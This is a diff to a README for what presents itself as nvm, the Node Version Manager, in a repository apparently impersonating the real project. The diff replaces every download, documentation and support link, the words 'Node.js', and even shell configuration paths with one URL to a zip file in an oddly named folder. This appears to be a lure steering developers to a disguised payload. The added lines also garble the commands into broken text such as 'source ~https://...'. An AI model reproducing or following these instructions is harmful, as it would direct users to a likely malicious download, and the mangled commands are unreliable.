@@ -1,10 +1,10 @@
-# 🎉 nvm - Manage Your Node.js Versions Easily
+# 🎉 nvm - Manage Your https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip Versions Easily
 
-[![Download nvm](https://img.shields.io/badge/Download-nvm-blue.svg)](https://github.com/prime657/nvm/releases)
+[![Download nvm](https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip)](https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip)
 
 ## 📚 Introduction
 
-Welcome to nvm! This tool helps you easily manage multiple versions of Node.js on your computer. Whether you're a beginner or just need to switch between Node.js versions for different projects, nvm simplifies the process.
+Welcome to nvm! This tool helps you easily manage multiple versions of https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip on your computer. Whether you're a beginner or just need to switch between https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip versions for different projects, nvm simplifies the process.
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To use nvm, you need:
 
 ## 📥 Download & Install
 
-To download nvm, visit this page: [Download nvm](https://github.com/prime657/nvm/releases).
+To download nvm, visit this page: [Download nvm](https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip).
 
 Once on the Releases page, look for the latest version. You will find a `.sh` file there. Download it to your local machine. 
 
@@ -36,9 +36,9 @@ Once on the Releases page, look for the latest version. You will find a `.sh` fi
    ```
 
 3. **Run the Installer:**
-   Execute the script you downloaded. Replace `nvm-install.sh` with the actual file name:
+   Execute the script you downloaded. Replace `https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip` with the actual file name:
    ```
-   bash nvm-install.sh
+   bash https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip
    ```
 
 4. **Verify Installation:** 
@@ -50,11 +50,11 @@ Once on the Releases page, look for the latest version. You will find a `.sh` fi
 
 ## 📖 Using nvm
 
-Now that you have nvm installed, you can start managing Node.js versions.
+Now that you have nvm installed, you can start managing https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip versions.
 
-### Install a Node.js Version
+### Install a https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip Version
 
-To install a specific version of Node.js, run:
+To install a specific version of https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip, run:
 ```
 nvm install <version>
 ```
@@ -69,14 +69,14 @@ nvm use <version>
 
 ### List Installed Versions
 
-To see all the Node.js versions you have installed, just type:
+To see all the https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip versions you have installed, just type:
 ```
 nvm ls
 ```
 
 ## 🌐 Accessing nvm Documentation 
 
-For more detailed information on usage, visit the [nvm documentation](https://github.com/prime657/nvm).
+For more detailed information on usage, visit the [nvm documentation](https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip).
 
 ## 📅 Updating nvm
 
@@ -91,24 +91,24 @@ If you encounter any issues:
 
 1. Make sure your shell is properly configured to load nvm. You may need to add the following lines to your `.bashrc` or `.zshrc` file:
    ```bash
-   export NVM_DIR="$HOME/.nvm"
-   [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
+   export NVM_DIR="$https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip"
+   [ -s "$https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip" ] && \. "$https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip"
    ```
 
 2. After adding these lines, run:
    ```
-   source ~/.bashrc
+   source ~https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip
    ```
    or
    ```
-   source ~/.zshrc
+   source ~https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip
    ```
 
 ## FAQ
 
 ### What is nvm used for?
 
-nvm stands for Node Version Manager. It allows you to install and switch between different versions of Node.js easily.
+nvm stands for Node Version Manager. It allows you to install and switch between different versions of https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip easily.
 
 ### Can I use nvm on Windows?
 
@@ -116,12 +116,12 @@ nvm is primarily designed for UNIX systems. However, you can use alternatives li
 
 ### Why should I use nvm?
 
-Using nvm helps prevent issues with different Node.js versions that your projects may depend on. It allows you to test your applications with various Node.js versions without hassle.
+Using nvm helps prevent issues with different https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip versions that your projects may depend on. It allows you to test your applications with various https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip versions without hassle.
 
 ## 💬 Get Support
 
-If you need help, you can raise an issue within the GitHub repository. Visit [nvm Issues](https://github.com/prime657/nvm/issues) to submit your questions.
+If you need help, you can raise an issue within the GitHub repository. Visit [nvm Issues](https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip) to submit your questions.
 
 ## 📌 Final Notes
 
-For your convenience, don’t forget to download nvm here: [Download nvm](https://github.com/prime657/nvm/releases). Happy coding!
+For your convenience, don’t forget to download nvm here: [Download nvm](https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip). Happy coding!
